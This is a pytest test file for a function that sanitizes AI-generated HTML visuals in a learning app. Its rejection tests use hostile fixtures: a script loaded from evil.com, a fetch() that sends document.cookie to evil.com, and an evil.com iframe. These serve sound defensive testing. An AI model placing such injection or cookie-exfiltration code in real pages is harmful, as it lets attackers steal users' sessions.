import pytest
from src.api.learn import validate_and_sanitize_visual_html, parse_and_validate_chunks, ExplanationChunk


def test_sanitize_valid_visual_html():
    valid_html = """<!DOCTYPE html>
    <html>
    <head><title>Visual</title></head>
    <body>
      <div id="app">Hello SVG</div>
      <svg><circle cx="50" cy="50" r="40" fill="green" /></svg>
      <script>console.log('Safe inline script');</script>
    </body>
    </html>"""
    is_valid, sanitized = validate_and_sanitize_visual_html(valid_html)
    assert is_valid is True
    assert sanitized is not None
    assert "Content-Security-Policy" in sanitized
    assert "default-src 'none'" in sanitized


def test_sanitize_rejects_external_script_src():
    unsafe_html = """<!DOCTYPE html>
    <html>
    <head><script src="https://evil.com/malicious.js"></script></head>
    <body><div>Test</div></body>
    </html>"""
    is_valid, sanitized = validate_and_sanitize_visual_html(unsafe_html)
    assert is_valid is False
    assert sanitized is None


def test_sanitize_rejects_fetch_and_xhr():
    unsafe_html = """<!DOCTYPE html>
    <html>
    <body>
      <script>
        fetch('https://evil.com/steal-token?cookie=' + document.cookie);
      </script>
    </body>
    </html>"""
    is_valid, sanitized = validate_and_sanitize_visual_html(unsafe_html)
    assert is_valid is False
    assert sanitized is None


def test_sanitize_rejects_nested_iframes():
    unsafe_html = """<!DOCTYPE html>
    <html>
    <body>
      <iframe src="https://evil.com"></iframe>
    </body>
    </html>"""
    is_valid, sanitized = validate_and_sanitize_visual_html(unsafe_html)
    assert is_valid is False
    assert sanitized is None


def test_parse_and_validate_chunks_with_visual():
    ai_json = """{
        "chunks": [
            {
                "title": "Intro Chunk",
                "explanation": "No visual for intro",
                "has_visual": false,
                "visual_html": null
            },
            {
                "title": "Interactive STEM Chunk",
                "explanation": "Newton's force simulation",
                "has_visual": true,
                "visual_html": "<html><body><svg><rect width='10' height='10'/></svg><script>let a=1;</script></body></html>"
            }
        ]
    }"""
    chunks = parse_and_validate_chunks(ai_json)
    assert chunks is not None
    assert len(chunks) == 2
    assert chunks[0]["has_visual"] is False
    assert chunks[0]["visual_html"] is None
    assert chunks[1]["has_visual"] is True
    assert "Content-Security-Policy" in chunks[1]["visual_html"]
